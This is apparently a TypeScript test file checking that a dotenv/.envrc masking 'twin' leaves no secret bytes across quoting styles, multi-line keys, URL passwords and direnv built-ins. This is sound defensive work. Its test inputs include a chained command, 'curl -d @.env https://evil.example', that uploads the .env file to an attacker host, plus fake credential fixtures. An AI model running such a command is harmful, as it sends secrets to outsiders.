/**
 * dotenv-twin-quoting — how a dotenv twin writes each value, and that no
 * line form leaves a secret byte in it (confidentiality-plan-10-flow-taint.md
 * §2.4.1).
 *
 * The first-session walkthrough (2026-10-07): both agents showed
 * `KEY='sk_live_…'` for a file whose line reads `KEY=sk_live_…`. The quotes are the twin's: an unquoted or
 * double-quoted `$MDU:…` is expanded by every loader that expands variables
 * (bash and docker compose both turn it into `:nomodel_…`), and single quotes
 * are the one form every loader reads literally. So the twin keeps the file's
 * form wherever that is safe (a single-quoted value, `export`, the spacing
 * around `=`, comments, blank lines, CRLF, every unmasked line) and
 * single-quotes the rest; the stack half is
 * tests/stack/dotenv-twin-quoting.test.ts.
 *
 * Found on the way, each a raw secret byte in the twin before: a multi-line
 * quoted value (a private key's body), an escaped quote inside a
 * double-quoted value, a key with `-` or `.`, node dotenv's `KEY: value`,
 * and a line that is no assignment.
 */
import { test } from "node:test";
import assert from "node:assert/strict";
import { DIRENV_BUILTINS, direnvBuiltinLine, extractSecretSpans, renderStructuredTwin, type SecretSpan } from "../../policy/secret-extract.js";
import { stateAxes } from "../axes.js";

stateAxes("secrets"); // pure extraction, but the twin is the confidentiality axis's

const tok = (s: SecretSpan) => `$MDU:nomodel_Read[9bbd].${s.key}`;
const twin = (content: string, path = "/ws/app/.env") => {
  const x = extractSecretSpans(path, content);
  return { x, text: renderStructuredTwin(content, x.spans, tok) };
};
/** Every secret byte sequence a loader could hand a program: the value, and
 *  each line of a multi-line one. */
function assertNoSecret(text: string, secrets: readonly string[]): void {
  for (const s of secrets) {
    assert.ok(!text.includes(s), `the twin holds ${JSON.stringify(s)}: ${JSON.stringify(text)}`);
    for (const piece of s.split("\n")) if (piece.length >= 6) assert.ok(!text.includes(piece), `the twin holds the line ${JSON.stringify(piece)}`);
  }
}

test("each quoting style: single-quoted stays as written, unquoted / double-quoted / backquoted gain single quotes", () => {
  const cases: Array<[string, string]> = [
    ["STRIPE_KEY=sk_live_unq123", "STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'"],
    ['STRIPE_KEY="sk_live_dq456"', "STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'"],
    ["STRIPE_KEY='sk_live_sq789'", "STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'"],
    ["STRIPE_KEY=`sk_live_bq000`", "STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'"],
  ];
  for (const [line, want] of cases) {
    const { x, text } = twin(`${line}\n`);
    assert.equal(text, `${want}\n`, line);
    assert.equal(x.spans.length, 1);
    assert.match(x.spans[0]!.value, /^sk_live_[a-z]{2,3}\d{3}$/, `${line}: the span's value is the secret, quotes not included`);
  }
});

test("the rest of the line stays as written: export, spacing around =, a trailing comment, CRLF, comments, blank lines, benign values", () => {
  const raw = [
    "# app config",
    "",
    "export API_TOKEN='tok_sq_abcdef'  # single, exported",
    "export  DB_PASSWORD = hunter2hunter2   # spaced",
    "  PORT=3000",
    "NODE_ENV=production",
    "EMPTY=",
    "EMPTY_Q=''",
    "\t# indented comment",
    "",
  ].join("\r\n");
  const { text } = twin(raw);
  assert.equal(
    text,
    [
      "# app config",
      "",
      "export API_TOKEN='$MDU:nomodel_Read[9bbd].API_TOKEN'  # single, exported",
      "export  DB_PASSWORD = '$MDU:nomodel_Read[9bbd].DB_PASSWORD'   # spaced",
      "  PORT=3000",
      "NODE_ENV=production",
      "EMPTY=",
      "EMPTY_Q=''",
      "\t# indented comment",
      "",
    ].join("\r\n"),
  );
});

test("a single-quoted URL keeps every byte but the password; an unquoted or double-quoted one gains the quotes around the whole value", () => {
  const sq = twin("DATABASE_URL='postgres://app:pw_sq_123@db:5432/prod'\n");
  assert.equal(sq.text, "DATABASE_URL='postgres://app:$MDU:nomodel_Read[9bbd].DATABASE_URL.password@db:5432/prod'\n");
  assert.deepEqual(sq.x.spans.map((s) => [s.key, s.value]), [["DATABASE_URL.password", "pw_sq_123"]]);
  for (const line of ["DATABASE_URL=postgres://app:pw_xx_123@db:5432/prod", 'DATABASE_URL="postgres://app:pw_xx_123@db:5432/prod"']) {
    assert.equal(twin(`${line}\n`).text, "DATABASE_URL='postgres://app:$MDU:nomodel_Read[9bbd].DATABASE_URL.password@db:5432/prod'\n", line);
  }
});

test("a URL whose text around the password cannot sit in single quotes masks the whole value", () => {
  const { x, text } = twin("DATABASE_URL=postgres://o'neil:pw_quote_1@h/db\n");
  assert.equal(text, "DATABASE_URL='$MDU:nomodel_Read[9bbd].DATABASE_URL'\n");
  assert.deepEqual(x.spans.map((s) => [s.key, s.value]), [["DATABASE_URL", "postgres://o'neil:pw_quote_1@h/db"]]);
  const b = twin('DATABASE_URL="postgres://a\\\\b:pw_bslash_1@h/db"\n');
  assert.equal(b.text, "DATABASE_URL='$MDU:nomodel_Read[9bbd].DATABASE_URL'\n");
});

test("multi-line quoted values (double, single, backquote) are one span, the body included", () => {
  const key = "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASC\nbody2body2body2body2\n-----END PRIVATE KEY-----";
  for (const q of ['"', "'", "`"]) {
    const raw = `# key\nPRIVATE_KEY=${q}${key}${q} # pem\nPORT=3000\nNEXT_TOKEN=tok_after_1\n`;
    const { x, text } = twin(raw);
    assert.equal(
      text,
      "# key\nPRIVATE_KEY='$MDU:nomodel_Read[9bbd].PRIVATE_KEY' # pem\nPORT=3000\nNEXT_TOKEN='$MDU:nomodel_Read[9bbd].NEXT_TOKEN'\n",
      `quote ${q}`,
    );
    assert.equal(x.spans[0]!.value, key);
    assertNoSecret(text, [key, "tok_after_1"]);
  }
});

test("an escaped quote inside a double-quoted value does not end it", () => {
  const { x, text } = twin('API_TOKEN="ab\\"cd_rest_of_secret"\nPORT=3000\n');
  assert.equal(text, "API_TOKEN='$MDU:nomodel_Read[9bbd].API_TOKEN'\nPORT=3000\n");
  assert.equal(x.spans[0]!.value, 'ab\\"cd_rest_of_secret');
  assertNoSecret(text, ["cd_rest_of_secret"]);
});

test("a quote never closed, or text after the closing quote: the rest of the line is the value", () => {
  const a = twin('API_TOKEN="unclosed_secret_1\nPORT=3000\n');
  assert.equal(a.text, "API_TOKEN='$MDU:nomodel_Read[9bbd].API_TOKEN'\nPORT=3000\n");
  assert.equal(a.x.spans[0]!.value, '"unclosed_secret_1');
  const b = twin("API_TOKEN='ab'cd_after_quote # note\n");
  assert.equal(b.text, "API_TOKEN='$MDU:nomodel_Read[9bbd].API_TOKEN' # note\n");
  assertNoSecret(b.text, ["cd_after_quote"]);
  // a quote that "closes" on a later line with text after it is no multi-line value
  const c = twin('A_TOKEN="first_secret_1\nB_TOKEN="second_secret_2"\n');
  assertNoSecret(c.text, ["first_secret_1", "second_secret_2"]);
  assert.deepEqual(c.x.spans.map((s) => s.key), ["A_TOKEN", "B_TOKEN"]);
});

test("node dotenv's key grammar and `KEY: value` form are assignments", () => {
  const { x, text } = twin("API-KEY=sk_dash_secret\nmy.service.token=sk_dot_secret\nCOLON_TOKEN: sk_colon_secret\n");
  assert.equal(
    text,
    "API-KEY='$MDU:nomodel_Read[9bbd].API-KEY'\nmy.service.token='$MDU:nomodel_Read[9bbd].my.service.token'\nCOLON_TOKEN: '$MDU:nomodel_Read[9bbd].COLON_TOKEN'\n",
  );
  assert.deepEqual(x.spans.map((s) => s.value), ["sk_dash_secret", "sk_dot_secret", "sk_colon_secret"]);
});

test("a line that is no assignment is masked whole; the allexport switch and a bare export of names stay", () => {
  // In a `.env` a direnv command is no built-in: only an `.envrc` has the allow-list.
  const raw = "set -a\nuse nix\ngh auth login --with-token ghp_cmdsecret_000\nexport FOO BAR\nset +a\nset -o allexport\n";
  const { x, text } = twin(raw, "/ws/app/.env");
  assert.equal(
    text,
    "set -a\n$MDU:nomodel_Read[9bbd].line2\n$MDU:nomodel_Read[9bbd].line3\nexport FOO BAR\nset +a\nset -o allexport\n",
  );
  assert.deepEqual(x.spans.map((s) => [s.key, s.value]), [["line2", "use nix"], ["line3", "gh auth login --with-token ghp_cmdsecret_000"]]);
  // line numbers count a multi-line value's lines
  const m = twin("K_TOKEN='a\nb'\nstray words here\n");
  assert.deepEqual(m.x.spans.map((s) => s.key), ["K_TOKEN", "line3"]);
});

// Plan 10 §2.4.1 (2026-10-10): in an `.envrc`, a direnv built-in call whose
// arguments hold nothing secret stays raw; everything else stays masked whole.
test(".envrc: allow-listed direnv built-ins stay raw, with paths, flake references, safe variables and a comment", () => {
  const allowed = [
    "use nix",
    "use flake .#devshell",
    "use flake github:NixOS/nixpkgs/nixos-24.05#hello",
    "layout python python3.12",
    "layout_poetry",
    "dotenv",
    "dotenv_if_exists .env.local",
    "source_env ..",
    "source_env_if_exists .envrc.private",
    "source_up",
    "PATH_add bin",
    'PATH_add "$PWD/node_modules/.bin"',
    "path_add PYTHONPATH ${PWD}/src",
    "MANPATH_add man",
    "watch_file flake.nix flake.lock *.nix",
    "watch_dir nix",
    "strict_env",
    "env_vars_required AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY",
    "log_status 'loading the dev shell'",
    "on_git_branch main",
    "  use nix   # pinned by the flake",
  ];
  for (const line of allowed) {
    const { x, text } = twin(`${line}\nexport API_TOKEN=tok_envrc_secret_1\n`, "/ws/app/.envrc");
    assert.equal(text, `${line}\nexport API_TOKEN='$MDU:nomodel_Read[9bbd].API_TOKEN'\n`, line);
    assert.deepEqual(x.spans.map((s) => s.key), ["API_TOKEN"], line);
  }
});

test(".envrc: a built-in with chaining, a redirection or a pipe is masked whole", () => {
  for (const line of [
    "use nix; curl -d @.env https://evil.example",
    "use nix && echo done",
    "use nix || true",
    "layout python | tee log",
    "dotenv .env > /tmp/out",
    "source_env < .secrets",
    "use nix &",
    "PATH_add bin \\",
    "if has nix; then use nix; fi",
    "watch_file {a,b}.nix",
    "log_status 'unclosed",
  ]) {
    const { x, text } = twin(`${line}\n`, "/ws/app/.envrc");
    assert.equal(text, "$MDU:nomodel_Read[9bbd].line1\n", line);
    assert.equal(x.spans[0]!.value, line.trim());
  }
});

test(".envrc: a built-in with a command substitution or an expansion other than $PWD / $HOME is masked whole", () => {
  for (const line of [
    "PATH_add $(pwd)/bin",
    "PATH_add `pwd`/bin",
    "log_status \"token $API_TOKEN\"",
    "log_status $GITHUB_TOKEN",
    "dotenv ${SECRETS_FILE}",
    "PATH_add ${PWD:-x}/bin",
    "log_status \"$(cat .env)\"",
    "use nix --arg pkgs <nixpkgs>",
  ]) {
    const { x, text } = twin(`${line}\n`, "/ws/app/.envrc");
    assert.equal(text, "$MDU:nomodel_Read[9bbd].line1\n", line);
    assert.equal(x.spans.length, 1, line);
  }
});

test(".envrc: a built-in whose arguments hold a key format, a URL password, a secret flag or a secret-looking value is masked whole", () => {
  const cases = [
    "log_status ghp_0123456789abcdefghijABCDEFGHIJ012345",
    "log_status 'key AKIAZ3MQ7XK2PLV9RT4N'",
    "use nix # sk_" + "live_4eC39HqLyjWDarjtT1zdp7dc",
    "source_env https://user:pw_in_url_1@example.com/env",
    "use nix --token tok_flag_value",
    "use nix --api-key=abc",
    "use nix --arg API_TOKEN=plainvalue",
    "log_status 'x9Fq2LmZ7vRt3WpK8sYb'",
    "source_env secrets/x9Fq2LmZ7vRt3WpK8sYb/env", // a random piece inside a path
    "log_status 'aGk3bX9qWz/Lp4R7tYv2Nc8sFd=='", // base64, its `/` aside
    "use flake github:NixOS/nixpkgs/5ed627539ac84809c78b2dd6d26a5cebeb5ae269", // a pinned rev: the cost
  ];
  for (const line of cases) {
    const { x, text } = twin(`${line}\n`, "/ws/app/.envrc");
    assert.equal(text, "$MDU:nomodel_Read[9bbd].line1\n", line);
    assert.equal(x.spans[0]!.value, line);
  }
  // Not built-ins at all: masked whole, as before.
  for (const line of ["fetchurl https://example.com/x sha256-abc", "direnv_load op run -- direnv dump", "gh auth login --with-token ghp_cmd_000", "eval \"$(lorri direnv)\"", "use_nix_extra"]) {
    assert.equal(twin(`${line}\n`, "/ws/app/.envrc").text, "$MDU:nomodel_Read[9bbd].line1\n", line);
  }
});

test(".envrc: export lines keep their twin, and a secret repeated on an allowed line is still replaced", () => {
  const raw = [
    "export DB_PASSWORD=\"hunter2hunter2\"",
    "export PORT=3000",
    "STRIPE_KEY='sk_live_envrc_9f8e7d6c'",
    "export FOO BAR",
    "use nix",
    "log_status 'db uses hunter2hunter2'",
    "log_status 'stripe is sk_live_envrc_9f8e7d6c'",
    "",
  ].join("\n");
  const { x, text } = twin(raw, "/ws/app/.envrc");
  assert.equal(text, [
    "export DB_PASSWORD='$MDU:nomodel_Read[9bbd].DB_PASSWORD'",
    "export PORT=3000",
    "STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'",
    "export FOO BAR",
    "use nix",
    // a value too plain for the line check, repeated: the twin still replaces it
    "log_status 'db uses $MDU:nomodel_Read[9bbd].DB_PASSWORD'",
    // a secret-looking value: the line is masked whole
    "$MDU:nomodel_Read[9bbd].line7",
    "",
  ].join("\n"));
  assertNoSecret(text, ["hunter2hunter2", "sk_live_envrc_9f8e7d6c"]);
  assert.deepEqual(x.spans.map((s) => s.key), ["DB_PASSWORD", "STRIPE_KEY", "line7"]);
  // The same `.env` lines read alike in either file: only the non-assignment lines differ.
  const env = twin(raw, "/ws/app/.env");
  assert.equal(env.text.split("\n").slice(0, 4).join("\n"), text.split("\n").slice(0, 4).join("\n"));
  assert.equal(env.text.split("\n")[4], "$MDU:nomodel_Read[9bbd].line5");
});

test("direnvBuiltinLine: the allow-list holds no built-in that runs a command or fetches a URL", () => {
  for (const b of ["fetchurl", "source_url", "direnv_load", "rvm", "join_args", "user_rel_path", "semver_search"]) {
    assert.ok(!DIRENV_BUILTINS.has(b), b);
    assert.equal(direnvBuiltinLine(`${b} x`), false, b);
  }
  assert.equal(direnvBuiltinLine("use nix"), true);
  assert.equal(direnvBuiltinLine("use\tnix"), true);
  assert.equal(direnvBuiltinLine("usenix"), false);
  assert.equal(direnvBuiltinLine("use=nix"), false);
});

test("no line form leaves a secret byte in the twin", () => {
  const secrets = [
    "sk_live_corpus_1", "sk_live_corpus_2", "sk_live_corpus_3", "pw_corpus_4", "multi_corpus_5a\nmulti_corpus_5b",
    'esc\\"corpus_6', "corpus_7_dash", "corpus_8_colon", "corpus_9_cmd",
  ];
  const raw = [
    "A=sk_live_corpus_1",
    'B="sk_live_corpus_2"',
    "C='sk_live_corpus_3' # c",
    "D=postgres://u:pw_corpus_4@h/db",
    'E="multi_corpus_5a\nmulti_corpus_5b"',
    'F="esc\\"corpus_6"',
    "G-KEY=corpus_7_dash",
    "H: corpus_8_colon",
    "deploy --token corpus_9_cmd",
    "",
  ].join("\n");
  const { text } = twin(raw);
  assertNoSecret(text, secrets);
  for (const ending of ["\r\n", ""]) assertNoSecret(twin(raw.replace(/\n/g, "\r\n") + ending).text, secrets.map((s) => s.replace(/\n/g, "\r\n").split("\r\n")[0]!));
});

// Plan 10 §2.4 (2026-10-09): the generator replaced only each value's own
// span, so a comment repeating a secret value kept it verbatim in the twin
// (no leak: the value backstop masked the whole Read, at the cost of the
// per-key view). Now every occurrence is replaced.
test("a secret value repeated outside its span (a comment, another value) is replaced by its own token", () => {
  const STRIPE = "sk_live_repeat_51HxZq0123";
  const PW = "pg_repeat_pw_Zx81qWv0";
  const raw = [
    `# rotated from ${STRIPE} last week (was ${STRIPE}x)`,
    `STRIPE_KEY=${STRIPE}`,
    `DATABASE_URL=postgres://app:${PW}@db:5432/prod`,
    `# the db password ${PW} is shared with staging`,
    "PORT=3000",
    "",
  ].join("\n");
  const { text } = twin(raw);
  assertNoSecret(text, [STRIPE, PW]);
  assert.equal(text, [
    "# rotated from $MDU:nomodel_Read[9bbd].STRIPE_KEY last week (was $MDU:nomodel_Read[9bbd].STRIPE_KEYx)",
    "STRIPE_KEY='$MDU:nomodel_Read[9bbd].STRIPE_KEY'",
    "DATABASE_URL='postgres://app:$MDU:nomodel_Read[9bbd].DATABASE_URL.password@db:5432/prod'",
    "# the db password $MDU:nomodel_Read[9bbd].DATABASE_URL.password is shared with staging",
    "PORT=3000",
    "",
  ].join("\n"), "a long value is replaced wherever it stands, glued or not; the rest stays");
});

test("a SHORT repeated value is replaced where it stands as a word, not inside a longer word or key", () => {
  const { text } = twin("# the pin is 4821, not 48210\nAPP_PIN_4821X=1\nPIN_SECRET=4821\n");
  assert.equal(text, "# the pin is $MDU:nomodel_Read[9bbd].PIN_SECRET, not 48210\nAPP_PIN_4821X=1\nPIN_SECRET='$MDU:nomodel_Read[9bbd].PIN_SECRET'\n");
});

test("repeated texts: the longest wins at a position, overlapping occurrences leave no byte, encoded spans write their encoding", () => {
  // Two values, one inside the other: the comment's longer text takes the longer value's token.
  const content = "# abcdefgh12345678 and abcdefgh\nA=abcdefgh12345678\nB=abcdefgh\n";
  const spans: SecretSpan[] = [
    { key: "A", start: content.indexOf("A=") + 2, end: content.indexOf("A=") + 18, value: "abcdefgh12345678" },
    { key: "B", start: content.indexOf("B=") + 2, end: content.indexOf("B=") + 10, value: "abcdefgh" },
  ];
  assert.equal(renderStructuredTwin(content, spans, (s) => `<${s.key}>`), "# <A> and <B>\nA=<A>\nB=<B>\n");
  // Overlapping occurrences of two values: neither leaves a byte.
  const o = "# 0123456789abcdefXYZW\nA=0123456789abcdef\nB=abcdefXYZW\n";
  const os: SecretSpan[] = [
    { key: "A", start: o.indexOf("A=") + 2, end: o.indexOf("A=") + 18, value: "0123456789abcdef" },
    { key: "B", start: o.indexOf("B=") + 2, end: o.indexOf("B=") + 12, value: "abcdefXYZW" },
  ];
  const ot = renderStructuredTwin(o, os, (s) => `<${s.key}>`);
  assert.equal(ot.split("\n")[0], "# <A><B>");
  // An encoded span (npm's base64 `_password`): the file's own text repeated
  // in a comment gets the token in that encoding; the decoded value, the plain token.
  const n = "; old: cGFzc3dvcmQxMjM= (password123)\n//r.example/:_password=cGFzc3dvcmQxMjM=\n";
  const at = n.lastIndexOf("cGFzc3dvcmQxMjM=");
  const ns: SecretSpan[] = [{ key: "pw", start: at, end: at + 16, value: "password123", encoded: "base64" }];
  const nt = renderStructuredTwin(n, ns, () => "TOK");
  const b64 = Buffer.from("TOK", "utf8").toString("base64");
  assert.equal(nt, `; old: ${b64} (TOK)\n//r.example/:_password=${b64}\n`);
});
